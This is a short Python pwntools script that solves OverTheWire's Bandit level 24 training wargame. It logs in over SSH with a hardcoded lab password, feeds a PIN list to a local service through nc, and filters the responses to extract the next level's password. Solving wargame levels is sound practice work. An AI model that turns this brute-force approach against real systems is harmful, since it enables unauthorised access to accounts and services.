#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit24 exploit by SKane')

shell = ssh('bandit24', 'bandit.labs.overthewire.org', password='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ', port=2220)

sh = shell.run('sh')

sh.sendline("cat /tmp/pincode123/passlist.txt | nc localhost 30002 | awk '{print $7}' | sort | uniq -u")

log.success("Password for bandit25: " + sh.recvline())
